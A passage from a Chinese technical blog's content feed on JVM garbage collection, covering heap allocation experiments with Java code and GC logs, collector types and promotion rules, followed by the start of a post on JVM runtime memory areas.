class="line"><span class="comment">     * -XX:SurvivorRatio=8—设置eden区和survivor区的比例为8:1:1</span></span><br><span class="line"><span class="comment">     * -XX:PretenureSizeThreshold=10485760—设置最大对象的阈值为10m</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 当前为6m时，可以将对象全部放在eden区</span></span><br><span class="line"><span class="comment">         * par new generation   total 9216K, used 8000K</span></span><br><span class="line"><span class="comment">         * eden space 8192K,  97% used</span></span><br><span class="line"><span class="comment">         * from space 1024K,   0% used</span></span><br><span class="line"><span class="comment">         * concurrent mark-sweep generation total 10240K, used 0K</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        a1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span> * <span class="number">1024</span>];<span class="comment">//1m</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 可以发现当再添加189k时,发生了第一次gc，</span></span><br><span class="line"><span class="comment">         * 如果Survivor区放不下存活对象，存活对象并不是全都进入老年代，而是部分对象进入老年代，部分对象继续被分配到Survivor区</span></span><br><span class="line"><span class="comment">         * par new generation   total 9216K, used 720K</span></span><br><span class="line"><span class="comment">         * eden space 8192K,   1% used</span></span><br><span class="line"><span class="comment">         * from space 1024K,  62% used</span></span><br><span class="line"><span class="comment">         * concurrent mark-sweep generation total 10240K, used 6146K</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        a2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">189</span>* <span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//直接分配一个5m的对象，由于eden区只有8m，之前已经分配了的再加上一些未知对象也会占据一定的内存空间，此时必然会引起新生代gc</span></span><br><span class="line">        a3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>];<span class="comment">//5m</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    可以发现在上面的实验情况与我们想象的并不一样，结论就是：<code>如果Survivor区放不下存活对象，存活对象并不是全都进入老年代，而是部分对象进入老年代，部分对象继续被分配到Survivor区。</code>下面还有一种情况我们用代测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">demo2</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 此时从红框中的信息可以清晰的发现，from区被占用率为0%，</span></span><br><span class="line"><span class="comment">     * 而老年代空间则被使用了26m左右，存活对象还是25m，逻辑没变，</span></span><br><span class="line"><span class="comment">     * 那么这情况就可以表明25m对象在新生代gc后都进入了老年代。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 结论：新生代gc后，如果触发了老年代gc，即使survivor区放的下部分存活对象，对象也会全部进入老年代。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadData</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">//一开始我们就分配了80m，相当于一个eden区</span></span><br><span class="line">        <span class="type">byte</span>[] data0 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">80</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        data0 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//请求40m</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//每个请求10m</span></span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        data = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] data1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        <span class="type">byte</span>[] data2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        <span class="type">byte</span>[] data3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        data3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        data3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * -XX:NewSize=104857600—新生代大小为100m</span></span><br><span class="line"><span class="comment">     * -XX:MaxNewSize=104857600—新生代最大大小为100m</span></span><br><span class="line"><span class="comment">     * -Xms200M—初始堆大小为200m</span></span><br><span class="line"><span class="comment">     * -Xmx200M—最大堆大小为200m</span></span><br><span class="line"><span class="comment">     * -XX:+UseParNewGC：新生代使用ParNewGC垃圾回收器</span></span><br><span class="line"><span class="comment">     * -XX:+UseConcMarkSweepGC---老年代使用CMS</span></span><br><span class="line"><span class="comment">     * -XX:+PrintGCDetails---打印GC详细日志</span></span><br><span class="line"><span class="comment">     * -XX:+PrintGCTimeStamps—打印GC时间</span></span><br><span class="line"><span class="comment">     * -XX:SurvivorRatio=8—设置eden区和survivor区的比例为8:1:1</span></span><br><span class="line"><span class="comment">     * -XX:PretenureSizeThreshold=104857600—设置最大对象的阈值为100m</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 上述代码一开始就被分配了80m的大对象，所以这个对象会直接进入老年代占据80m空间，</span></span><br><span class="line"><span class="comment">         * 那老年代就只剩20m空间了。肯定不够分配新生代GC后的存活下来的25m对象，就会触发full gc。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        loadData();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    上面测试的结论是：<code>新生代gc后，如果触发了老年代gc，即使survivor区放的下部分存活对象，对象也会全部进入老年代。</code></p><h3 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h3><p>​    现在我们是针对的<code>老年代</code>对象的存亡特征，其中标记的过程仍然是”标记-清除”，但后续不是直接清除可回收对象，而是让所有存活对象都向内存空间一端移动，然后直接清理掉边界值以外的内存，这样也不用担心空间碎片的问题了。但是缺点也很明显，老年代中大部分都向都是存活的，如果移动并更新引用它们的地方，也是非常负重的操作。而且必须暂停所有的用户应用程序才能进行。</p><p>​    所以如果是使用标记-清除算法，内存分配会很复杂，使用标记-整理算法，内存回收时很复杂。Hotspot虚拟机里面关注吞吐量的<code>Parallel Old收集器</code>基于标记-整理算法的，关注延迟的<code>CMS收集器</code>是基于标记-清除的。具体详细内容可以去深入了解。</p><p>​    还有一种和稀泥的方法，前面一直使用标记-清理算法，暂时容忍空间碎片，当影响到对象分配时，再进行标记-整理算法。前面提到的<code>CMS收集器</code>遇到碎片过多时，采用的就是这个方式。</p><hr><h2 id="经典垃圾收集器"><a href="#经典垃圾收集器" class="headerlink" title="经典垃圾收集器"></a>经典垃圾收集器</h2><p>​    如果说垃圾收集算法是内存回收的方法论，那垃圾回收器就是内存回收的实践者，在《Java虚拟机规范》并未声明垃圾收集器规定，所以各个厂商，不同版本的垃圾收集器都会有一些差别，不同的虚拟机也会提供不同的参数来选择适合自己场景的收集器。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heftlrvrj30j60eqt9h.jpg" alt="image-20220628151229971"></p><p>​    上图为各个收集器直接可行的匹配关系。</p><h3 id="Serial-收集器"><a href="#Serial-收集器" class="headerlink" title="Serial 收集器"></a>Serial 收集器</h3><p>​    它是最基础的，最早的收集器，基于<code>标记复制</code>算法实现，特点：<code>单线程，当进行垃圾收集的时候，必须暂停其他所有工作线程，直到收集完毕，Stop The World</code>。对于大部分人来说是不可接受的，好比你每运行一小时，都得暂停是十五分钟。</p><p>​    但注意的是它依然是HotSpot虚拟机运行在客户端的默认新生代收集器，它的优点就是简单且高效，对于内存资源受限制的环境，它是所有收集器中额外内存消耗最小的，对于单核处理或者处理器较少时，Serial就很高效，没有线程交互的开销。</p><h3 id="ParNew-收集器"><a href="#ParNew-收集器" class="headerlink" title="ParNew 收集器"></a>ParNew 收集器</h3><p>​    相当于是一个Serial多线程并行版本，基于<code>标记复制</code>算法实现，其实性能一般，只不过是后来出现的CMS收集器只能个Serial和ParNew收集器配合使用，CMS收集器的一个特点就是首次实现垃圾收集线程和用户线程（基本上）同时工作。</p><p>​    但是后来又出现了G1收集器，G1收集器是一个面向全堆的收集器，所以ParNew就算是退休了，不过当随着可以被使用的处理器核数的增加，效率也会优化。</p><h3 id="Parallel-Scavenge-收集器"><a href="#Parallel-Scavenge-收集器" class="headerlink" title="Parallel Scavenge 收集器"></a>Parallel Scavenge 收集器</h3><p>​    一款新生代收集器，基于<code>标记-复制</code>算法实现的收集器，也是一个多线程收集器，那我们为啥使用它？</p><blockquote><p>是因为该收集器的特点是与其他收集器关注点不同</p></blockquote><p>​    CMS收集器的关注点是尽可能的缩短垃圾回收时，用户线程停顿的时间，而Parallel Scavenge关注的是吞吐量</p><p>$$ 吞吐量 = {用户代码运行时间 \over 用户代码运行时间+运行垃圾收集时间} $$</p><p>​    举个例子，如果代码运行+运行垃圾收集时间用了100分钟，其中垃圾收集用了一分钟，那吞吐量就是99%。主要适合于后台运算而不需要太多交互的分析任务。所以它也被称为<code>吞吐量优先收集器</code>。</p><p>​    可通过<code>-XXLMaxGCPauseMilis</code>来控制最大垃圾收集时间，也可通过<code>-XX:GCTimeRatio</code>参数设置吞吐量大小。还有一个重要参数<code>-XX:+UseAdaptiveSizePolicy</code>，它是一个开关，用了我们就不用自己设定新生代各个区域划分问题，虚拟机会自己收集信息，来动态调整最合适的划分，被称为：<code>垃圾收集的自适应的调节策略</code>。</p><hr><h2 id="实战：内存分配与回收策略"><a href="#实战：内存分配与回收策略" class="headerlink" title="实战：内存分配与回收策略"></a>实战：内存分配与回收策略</h2><p>​    Java技术体系的自动内存管理，最核心的目标就是自动化的解决两个问题：<code>内存分配</code>和<code>内存回收</code>，在之前我们讲的都是内存回收，现在我们来看一下内存分配的细节，这里我是使用JDK1.8，HotSpot虚拟机，使用的<code>ParallelGC</code></p><blockquote><p>这里有一个很细的点：《深入理解Java虚拟机》使用的<code>Serial+Serial Old</code>客户端默认收集器组合下的内存分配和回收策略，但咱们的jvm是服务端的，说是只能在32位机<code>jvm.cfg</code>修改文件使用客户端，所以当我运行书上第一个代码块儿时，就发现结果与书上不对，想不出原因，所以如果你也是ParallelGC，那么书本上本章上许多代码结果都是不一样的。一些VM参数也是无法使用的或者没有效果的。</p><ol><li>java -XX:+PrintCommandLineFlags -version    输出JVM默认垃圾收集器,第四行的<code>UseParallelGC</code>和最后一行的<code>Server VM</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root<span class="meta">@jeespring</span> ~]# java -XX:+PrintCommandLineFlags -version</span><br><span class="line">-XX:InitialHeapSize=<span class="number">132500800</span> -XX:MaxHeapSize=<span class="number">2120012800</span> -XX:+PrintCommandLineFlags </span><br><span class="line">-XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:-UseLargePagesIndividualAllocation -XX:+UseParallelGC</span><br><span class="line">java version <span class="string">&quot;1.8.0_211&quot;</span></span><br><span class="line">Java(TM) SE Runtime <span class="title function_">Environment</span> <span class="params">(build <span class="number">1.8</span><span class="number">.0_211</span>-b12)</span></span><br><span class="line">Java <span class="title function_">HotSpot</span><span class="params">(TM)</span> <span class="number">64</span>-Bit Server <span class="title function_">VM</span> <span class="params">(build <span class="number">25.211</span>-b12, mixed mode</span></span><br></pre></td></tr></table></figure><ol start="2"><li>/usr/libexec/java_home -V   这个是在mac上找我的jvm在哪</li><li>find . -name “jvm.cfg”   如果你找不到jvm.cfg，通过它去找,表示在当前路径下找</li><li>JVM的Server端和Client端区别网上有详细介绍，通俗的讲就是Client端轻量快速，Server端重量性能好（默认）。</li></ol></blockquote><blockquote><p>对象的内存分配从概念上来讲，应该是在堆上分配，不过实际中也可能通过即时编译后拆分为标量间接存储在栈上（这个在我之前写的<code>逃逸分析</code>中有说明）</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefveh9mj30g10bbq3f.jpg" alt="image-20220627093330808"></p><pre><code>### 对象优先在Eden分配（书本原题目）</code></pre><ol><li>Serial：当大对象要分配内存时，发现Eden区已经满了，而且Survivor区也不够，会将Eden区原来的对象直接放入老年代，再把新的对象放入Eden区。</li><li>Parallel（我测试的）：发现Eden区满了，Survivor区不够，会直接把大对象放到老年代，Eden区对象不变。读者可以自己再测试一遍</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象分配</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">no1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">_1MB</span>  <span class="operator">=</span> <span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * VM: -Xms20M -Xmx20M -Xmn10M -XX:SurvivorRatio=8  -XX:+PrintGCDetails</span></span><br><span class="line"><span class="comment">     * 堆空间分配20m，新生代10m，新生代中的Eden和Survivor为8：1：1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] a1,a2,a3,a4;</span><br><span class="line">        a1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2</span>*_1MB];</span><br><span class="line">        a2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2</span>*_1MB];</span><br><span class="line">        a3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2</span>*_1MB];</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 上面已经创建了8m，相当于Eden区已经满了，现在我们再放一个4M的对象</span></span><br><span class="line"><span class="comment">         * Eden已经放不下了，会启动一次MinorGC，我们看一下会之前的对象和新来的对象如何分配</span></span><br><span class="line"><span class="comment">         * </span></span><br><span class="line"><span class="comment">         *  PSYoungGen      total 9216K, used 8001K</span></span><br><span class="line"><span class="comment">         *      eden space 8192K, 97% used</span></span><br><span class="line"><span class="comment">         *      from space 1024K, 0% used</span></span><br><span class="line"><span class="comment">         *  ParOldGen       total 10240K, used 4096K</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        a4 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>*_1MB];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大对象直接进入老年代"><a href="#大对象直接进入老年代" class="headerlink" title="大对象直接进入老年代"></a>大对象直接进入老年代</h3><p>​    我们知道一般对象不会直接到老年区，得现在Eden区和Survivor区熬几轮，但如果有大的对象已经在里面了，那么就很容易触犯minor GC，导致对象进行标记-复制，所以可以可以通过设置<code>XX:PretenureSizeThreshold</code>来指定超过多大的对象直接去了老年区（注意这个参数Parallel无法使用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象分配</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">no1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">_1MB</span>  <span class="operator">=</span> <span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * VM:  -Xms20M -Xmx20M -Xmn10M -XX:SurvivorRatio=8  -XX:+PrintGCDetails -XX:PretenureSizeThreshold=3145728</span></span><br><span class="line"><span class="comment">     * 堆空间分配20m，新生代10m，新生代中的Eden和Survivor为8：1：1</span></span><br><span class="line"><span class="comment">     * -XX:PretenureSizeThreshold 表示 需要分配的对象只要大于3M，就直接分配到老年区，注意：这个参数只能Serial使用，ParallelGC无法使用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] a4;</span><br><span class="line">        a4 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>*_1MB];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="长期存活的对象进入老年代"><a href="#长期存活的对象进入老年代" class="headerlink" title="长期存活的对象进入老年代"></a>长期存活的对象进入老年代</h3><p>​    意思就是我们给每个对象定义一个对象年龄计数器，存储在对象头中，每经历一次Minor GC后存活，并可以存储到Survivor区时，年龄就+1，当长到系统<code>-MaxTenuringThreshold</code>设定值时（默认值15），就去老年代.</p><h3 id="动态对象年龄判定"><a href="#动态对象年龄判定" class="headerlink" title="动态对象年龄判定"></a>动态对象年龄判定</h3><p>​    这里就是说系统可以动态判断，如果每个对象都得等15轮minor GC，那就会导致频繁的GC，影响性能，如果Survivor区中对低于或者等于某个年龄的对象总和超过了Survivor空间的一半，那这个年龄及其以上的对象直接进入老年区。</p><h3 id="空间分配担保"><a href="#空间分配担保" class="headerlink" title="空间分配担保"></a>空间分配担保</h3><p>​    我们在前面就提到，其实老年代就是新生代的担保人，如果新生代放不下的对象，我就把对象放到老年代。根据这第一点我们就可以推断出每次<code>Minor GC</code>前，虚拟机都应检查老年代最大的连续空间是否有足够的空间装下新生代所有对象，如果空间足够，那我们就放心的Minor GC，如果不够了，虚拟机去查看<code>-XX:HandlePromotionFailur</code>参数是否允许担保失败，如果允许，继续检查老年代之前进来对象的平均大小是否小于老年代最大连续空间（简单来说：通过以前来的，猜测后面来的应该差不多大），如果足够，进行Minor GC，虽然有风险，如果不够，或者是没有担保，则直接<code>Full GC</code>,这就很影响性能了。所以一般都会将<code>-XX:HandlePromotionFailur</code>打开，来避免频繁的FUll GC。这个参数在JDK6 Update24后就不再使用了。</p><p>​    也就是现在只要老年代的连续空间大于新生代对象总大小或者以往对象的平均值大小，就会进行Minor GC，否则将进行Full GC。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    垃圾收集器在许多场景都是影响系统停顿时间和吞吐能力的重要因素，虚拟机之所以提供各种不同的收集器和大量的调节参数就是因为各种有各种的适用场景，需要我们不断探索，不断组合。当然我们也需要知道每种收集器的特点以及范围。</p>]]></content>
      
      
      <categories>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 垃圾回收 </tag>
            
            <tag> 内存分配 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存划分与溢出</title>
      <link href="/2022/11/25/JVM/2_Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E4%B8%8E%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E5%BC%82%E5%B8%B8/"/>
      <url>/2022/11/25/JVM/2_Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E4%B8%8E%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​        对于java与C&amp;C++开发的一大区别就在内存管理方面。Java是通过虚拟机管理内存，但如果不熟悉虚拟机怎么使用管理内存，出现内存泄露和内存溢出问题，修正就会很艰难。</p><h1 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h1><p>​        Java虚拟机在执行Java程序的过程中会把所管理的内存划分为一个个小部分，有的部分随着进程的启动而一直存在，有的部分随着用户线程的启动和结束而创建和销毁。其管理的内存分为以下几个运行时数据区域。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hec54446j31500ncn0t.jpg" alt="image-20220613084723714"></p><h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>​        是一块儿较小的内存空间，他可以看做是当前线程所执行的字节码的行号指示器，通俗的来讲就是通过改变计数器的值来选取下一条需要执行的字节码指令，它是程序控制流的指示器，分支，循环，跳转，异常处理，线程恢复等基础功能都是依赖计数器完成的。</p><p>​        在java多线程中，是利用线程轮流切换，分配处理器执行时间的方式来实现的，也就是说我执行了一会儿A线程，时间到了，我要去执行B线程了，那B线程执行时间到，我要再切换会A线程，那我怎么知道刚才任务完成到哪了？所以每个线程都私有一个程序计数器来保证线程切换后能回到正确的位置。</p><p>​        如果执行的是一个Java方法，则计数器记录的是正在执行的虚拟机字节码指令的地址，如果执行的是一个本地方法（native），这个计数器值则应为空（Undefined）。这里的内存区域是唯一在《Java虚拟机规范》中没有任何OutOfMemoryError情况的区域。</p><h2 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef5tqq8j310e0k641a.jpg" alt="image-20220613091716081"></p><p>​        Java虚拟机栈也是线程私有的，他的生命周期与线程相同，每个方法被调用的时候，虚拟机栈就会同步创建一个栈帧来存储局部变量表，操作数栈，动态链接，方法出口等信息，每个方法的调用与执行结束都对应这栈帧的入栈与出栈。</p><p>​        其中局部变量表存放编译器可知的各种虚拟机基本数据类型（int，char），对应引用（Object），returnAddress（指向一条字节码指令地址）。局部变量表需要多大的空间在编译期间就可以确定的。也就是变量槽数量是不变了的。</p><p>​        这里存在两种异常情况：</p><ol><li>栈溢出（StackOverflowError），一般我们在递归算法中如果无限调用方法就会爆出该错误</li><li>内存溢出（OutOfMemoryError），如果设置栈可以动态扩展空间，当栈无法申请到更多的空间就会爆出OOM内存溢出。</li></ol><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>​        与虚拟机栈类似，只不过虚拟站是执行Java方法，虚拟机栈是执行Native本地方法。也会有上述两种异常情况。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>​        堆是虚拟机管理内存中最大的一部分，<em>是所有线程所共享的</em> ，该区域的唯一目的就是存放对象实例。本里应该是所有对象都存放在这里的，不过随着Java语言的不断发展，也不是很绝对。</p><p>​        由于堆空间是垃圾回收器管理的内存区域，也叫做“GC堆”，从回收内存的角度来看，由于现代垃圾回收器大部分都是基于分代收集理论设计的，所以我们常说：新生代，老年代，永久代，Eden空间，From Survivor空间，To Survivor空间，但这个只是一部分垃圾回收器的共同特性和设计风格，并不是标准就是这么规定的，还有一些其他的垃圾回收策略。</p><p>​        从分配内存的角度来看。Java堆空间可以划分出多个线程私有的分配缓冲区，以提高对象分配时的效率。将堆空间进行细分，只是为了更好地内存回收和内存分配。</p><p>​        根据《Java虚拟机规范》，Java堆可以处于物理上不连续的内存空间，但是在逻辑上它应该被视为连续的。</p><p>​        Java堆可以被实现成固定大小的，可以设置为可扩展的。(通过参数-Xmx和-Xms设定)，如果没有可分配的内存了，也会爆出OOM异常。</p><h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>​        方法区也是各个线程共享的区域，主要存放虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码缓存。</p><p>​        这里必须提到“永久代”这个概念，在JDK8以前很多人吧方法区叫做永久代，这是因为在之前HotSpot团队将收集器的分代思想扩展到方法区，用永久代来实现方法区，这样垃圾回收器就可以像管理堆一样的管理栈，但其他的虚拟机实现中并没有永久代，例如JRockit，IBM j9，这个并不被规范设定，而属于各自的实现。现在来看用永久代来实现方法区，更容易导致内存溢出问题。永久代有一个默认上限值。所以到了JDK6时就已经有使用<strong>本地内存</strong>来实现方法区的计划，到了JDK7时，就将<code>字符串常量池，静态变量</code>等移植到堆中，到了JDK8就彻底放弃了永久代，使用本地内存来实现<strong>元空间（Meta-space）</strong>把JDK7中剩下的内容放入（主要是类型信息）。</p><p>​        方法区这部分管理是比较宽松的，不需要连续的内存和内存大小的动态性。甚至可以不实现垃圾回收，但是并不是进去了，就永远保留，主要的内存回收针对的是常量池的回收和对类型的卸载。</p><p>​        如果方法区无法分配到更多的内存空间，就会爆出OOM异常。</p><h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><p>​        属于方法区的一部分，Class文件中除了类的模板，字段，方法，接口等描述信息，还有一个就是常量池表,用于存放编译后的各种字面量和符号引用。这部分内容在类加载后放在方法区的运行时常量池。</p><p>​        运行时常量池的一个特点就是动态性，并不要求常量一定只有编译期才能产生，运行期间也可以将新的常量放入。用得较多的就是String::intern()方法。</p><p>​        这部分在方法区内所以也有OOM的风险。</p><h2 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h2><p>​        这部分并不属于运行时数据区域，但是又频繁使用，而且会导致OOM的风险。</p><p>​        在JDK1.4中新加入了NIO类，引入了基于管道和缓冲区的I/O方式，它可以还是用Native函数库直接分配堆外内存，然后通过一个存储在堆里的DirectByteBuffer对象作为这片内存的引用操作，这样能提高性能，不用在java堆和Native堆上来回复制数据。</p><p>​        显然直接内存不会受到堆内存大小的限制，但是肯定是受到本机总内存的限制，一般服务器管理员如果在配置虚拟机内存管理大小时忽略掉这部分大小，可能就导致总使用内存大于实际内存大小。从而导致动态扩展时导致OOM异常。</p><h1 id="HotSpot虚拟机对象探秘"><a href="#HotSpot虚拟机对象探秘" class="headerlink" 